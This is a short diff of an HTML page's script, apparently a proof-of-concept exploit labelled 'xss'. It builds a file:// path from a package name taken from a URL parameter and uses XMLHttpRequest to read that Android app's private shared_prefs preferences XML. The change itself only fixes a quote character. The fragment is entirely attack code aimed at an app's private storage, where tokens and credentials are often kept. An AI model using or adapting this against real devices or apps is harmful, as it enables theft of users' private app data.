@@ -12,7 +12,7 @@ xhr.onreadystatechange = function() {
 
 var aa = new URL(window.location.href).searchParams.get("aa");
 // xss
-xhr.open('GET', 'file:///data/data/' + aa + '/shared_prefs/' + aa + `_preferences.xml`, true);
+xhr.open('GET', 'file:///data/data/' + aa + '/shared_prefs/' + aa + '_preferences.xml', true);
 xhr.send(null);
     </script>
   </body>
